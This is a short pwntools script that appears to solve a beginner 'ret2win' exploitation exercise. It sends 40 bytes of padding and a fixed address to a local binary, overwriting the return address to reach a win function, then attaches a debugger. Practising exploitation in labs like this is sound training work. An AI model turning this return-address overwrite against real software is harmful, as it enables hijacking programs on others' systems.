from pwn import *

io = process("./ret2win")

payload = b"a"*40
payload += p64(0x0000000000400756)
io.sendline(payload)
gdb.attach(io)
io.interactive()